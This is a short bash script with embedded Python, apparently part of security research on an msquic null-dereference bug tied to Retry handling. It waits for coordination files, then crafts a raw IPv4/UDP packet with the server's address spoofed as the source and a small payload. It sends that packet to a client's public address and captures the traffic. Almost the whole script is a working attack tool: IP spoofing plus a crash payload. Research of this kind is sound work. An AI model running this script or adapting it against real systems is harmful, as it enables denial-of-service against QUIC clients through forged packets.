#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-internet-results/attacker"
mkdir -p "$RESULTS"
python3 "$ROOT/nettest-coord.py" wait "server.json" "$RESULTS/server.json"
python3 "$ROOT/nettest-coord.py" wait "mapping.json" "$RESULTS/mapping.json"
cat "$RESULTS/server.json" "$RESULTS/mapping.json"
sudo tcpdump -U -ni any udp -w "$RESULTS/attacker-egress.pcap" >/dev/null 2>&1 &
CAP_PID=$!
sleep 1
python3 - "$RESULTS/server.json" "$RESULTS/mapping.json" <<'PY' | tee "$RESULTS/attacker.log"
import ipaddress,json,socket,struct,sys
server=json.load(open(sys.argv[1])); target=json.load(open(sys.argv[2]))
src=ipaddress.IPv4Address(server["server_ip"]).packed
dst=ipaddress.IPv4Address(target["client_public_ip"]).packed
sport=int(server["server_port"]); dport=int(target["client_public_port"])
payload=bytes.fromhex("806b3343cf0000")
udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
header=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(udp),0x5a71,0,64,17,0,src,dst)
def checksum(data):
    if len(data)&1: data += b"\\x00"
    total=sum(struct.unpack("!%dH"%(len(data)//2),data))
    while total>>16: total=(total&0xffff)+(total>>16)
    return (~total)&0xffff
header=header[:10]+struct.pack("!H",checksum(header))+header[12:]
packet=header+udp
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
s.sendto(packet,(target["client_public_ip"],0))
print(f"SPOOF_SENT src={server['server_ip']}:{sport} dst={target['client_public_ip']}:{dport} payload={payload.hex()}")
PY
sleep 8
sudo kill "$CAP_PID" 2>/dev/null || true
wait "$CAP_PID" 2>/dev/null || true
sudo tcpdump -nn -r "$RESULTS/attacker-egress.pcap" -c 10 >"$RESULTS/attacker-egress.txt" 2>&1 || true
cat "$RESULTS/attacker.log" "$RESULTS/attacker-egress.txt"
